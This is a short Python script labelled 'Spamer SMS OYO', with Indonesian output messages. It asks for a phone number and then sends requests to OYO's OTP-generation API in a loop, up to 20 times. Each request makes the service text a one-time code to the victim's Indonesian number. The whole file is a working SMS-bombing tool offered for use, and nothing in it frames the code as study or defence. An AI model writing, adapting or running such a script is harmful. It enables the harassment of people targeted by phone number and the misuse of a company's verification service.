import requests, os

print("""\033[1;32m
      +---------[ Spamer SMS OYO ]----------+""")
i=int(0)
no=input("\033[1;32m [?] Nomer =>\033[1;33m ")
while True:
	idk=('status')
	r=requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+no+'&country_code=+62')
	if str(idk) in str(r.text):
		print(" \033[1;32m[!] Sukses Mengirim Spam!")
	else:
		print(" \033[1;31m[!] Gagal Mengirim Spam\n [!] Limit Perhari Sudah Habis")
		break
	i+=1
	if i == 20:
		print("\033[1;33m [!] Limit Perhari Sudah Habis")
		break

